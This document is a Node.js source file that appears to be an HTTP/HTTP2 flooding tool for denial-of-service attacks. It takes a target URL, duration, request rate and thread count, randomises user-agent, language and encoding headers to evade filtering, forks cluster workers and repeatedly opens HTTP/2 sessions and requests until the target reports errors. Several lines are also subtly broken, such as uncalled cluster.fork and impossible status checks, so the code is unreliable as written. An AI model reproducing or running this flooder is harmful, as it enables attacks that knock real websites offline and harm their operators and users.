const Chance = require("chance")
const http = require("http")
const cluster = require("cluster")
const http2 = require("http2")
const axios = require("axios")
const os = require("os")
const url = require("url")
const path = require("path")
const chance = new Chance()
const argv1 = process.argv[1]
const namefile = path.basename(argv1)
const target = process.argv[2]
const time = process.argv[3]
const rate = process.argv[4]
const thread = process.argv[5]
const theError = [ "ECONNRESET" ]
if ( process.argv.length < 6 ) {
	console.log("Using: node " + namefile + " [TARGET] [TIME] [RATE] [THREAD]")
	process.exit()
}
const paths = url.parse(target)
const pathss = paths.pathname;
const ua = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0",
    "Opera/9.80 (Android; Opera Mini/7.5.54678/28.2555; U; ru) Presto/2.10.289 Version/12.02",
    "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; Trident/6.0; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
    "Mozilla/5.0 (Android 11; Mobile; rv:99.0) Gecko/99.0 Firefox/99.0",
    "Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/99.0.4844.59 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; JSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
]
const lang = [
"cs;q=0.5",
 'en-US,en;q=0.9',
'en-GB,en;q=0.9',
'en-CA,en;q=0.9',
'en-AU,en;q=0.9',
'en-NZ,en;q=0.9',
'en-ZA,en;q=0.9',
'en-IE,en;q=0.9',
'en-IN,en;q=0.9',
'ar-SA,ar;q=0.9',
'az-Latn-AZ,az;q=0.9',
'be-BY,be;q=0.9',
'bg-BG,bg;q=0.9',
'bn-IN,bn;q=0.9',
'ca-ES,ca;q=0.9',
'cs-CZ,cs;q=0.9',
'cy-GB,cy;q=0.9',
'da-DK,da;q=0.9',
'de-DE,de;q=0.9',
'el-GR,el;q=0.9',
]
const encoding = [
'gzip, deflate, br',
'compress, gzip',
'deflate, gzip',
'gzip, identity',
'*'
]
try {
	if ( paths.protocol !== "http:" && paths.protocol !== "https:" ) {
		throw new Error("No protocol exists " + paths.protocol)
		process.exit()
	}
} catch {
	console.log("Invalid Protocol!")
	process.exit()
}
const agents = new http.Agent({
	KeepAliveMsecs: true,
	KeepAlive: true,
	maxSockets: Infinity,
	maxTotalSockets: Infinity,
	maxBodyLength: Infinity,
	noDelay: true,
	maxFreeSockets: Infinity,
})
function check() {
	axios({
		method: "GET",
		url: target,
		path: pathss,
		httpAgent: agents
	})
	.then(response => {
		if ( response.status === 200 ) {
			console.log("")
		} else {
			console.log("Status: ${response.status}")
		}
	})
	.catch(error => {
		if ( error.code === "ENOTFOUND" ) {
			console.log("Invalid Url")
			process.exit()
		}
		if ( error.code === "ECONNRESET" ) {
			check()
		}
	})
}
const authority = paths.hostname
const header = {
	":method": "GET",
	":path": pathss,
	"user-agent": chance.pickone(ua),
	"globalAgent": agents,
	"accept-language": chance.pickone(lang),
	"accept-encoding": chance.pickone(encoding),
}
const headerAxios = {
	url: target,
	method: "GET",
	port: 443,
	httpAgent: agents,
	path: pathss,
	header: {
		"accept-language": chance.pickone(lang),
		"accept-encoding": chance.pickone(encoding),
		"user-agent": chance.pickone(ua),
	}
}
function news(err) {
	for (let i = 0;i < rate;i++) {
		setInterval(() => {
			const client = http2.connect(target, {
				setting: {
					headerTableSize: 65536,
					maxHeaderListSize : 32768,
					initialWindowSize: 15564991,
					maxFrameSize : 16384,
					maxConcurrentStreams: 2000
				}
			})
			axios(headerAxios)
			.then(response => {
				if ( response.status === 200 ) {
					setTimeout(() => {
					console.log("Status: 200")
					}, 8000)
				}
				if ( response.status === 502 && response.status === 503 && response.status === 522 && response.status === 525 ) {
					console.log("Target is down")
				}
			})
			.catch(error => {
				if ( error.code === "ECONNRESET" ) {
					console.log("Retry connect!")
					setTimeout(() => {
						news()
					}, 1000)
				}
			})
			const session = client.request(header)
			session.setEncoding("utf-8")
			session.on("response", () => {
				session.close()
				session.destroy()
			})
			session.on("error", (err) => {
				if (err) {
					if( err.code === 'ECONNRESET' && err.code === "ERR_HTTP2_ERROR" ) {
						console.log("[!]Retry connect")
						setTimeout(() => {
							console.log("RETRY 2000ms")
							news()
						}, 2009)
					} else if ( err.code === 'ENOTFOUND' ) {
						console.log("[!]Not found target!")
						process.exit()
					}
				}
			})
			session.on("end", () => {
				session.destroy()
			})
		})
	}
}
if (cluster.isMaster) {
	check()
	console.clear()
	console.log("-------------------------")
	console.log("Target: " + target)
	console.log("Time: " + time)
	console.log("Rate: " + rate)
	console.log("Thread: " + thread)
	console.log("------------------------")
	for (let i = 0;i < thread;i++) {
		cluster.fork
		console.log("Create thread!")
	}
	cluster.on("exit", (worker, code, signal) => {
		setTimeout(() => {
			cluster.fork
		}, 500)
	})
	setInterval(() => {
		const total = os.totalmem()
		const used = process.memoryUsage().rss
		const phantram = (used / total) * 100
		if ( phantram >= 85 ) {
			console.log("[!]Max ram,to reset")
			const workers = Object.values(cluster.workers)
			const killtotal = workers[Math.floor(Math.random() * workers.length)]
			killtotal.kill()
		}
	}, 2000)
	setInterval(() => {
		news()
	},5000)
} else {
	for (let i = 0;i < thread;i++) {
		cluster.fork()
		console.log("Create thread 2")
	}
}
setTimeout(() => {
	process.exit()
}, time * 1000)
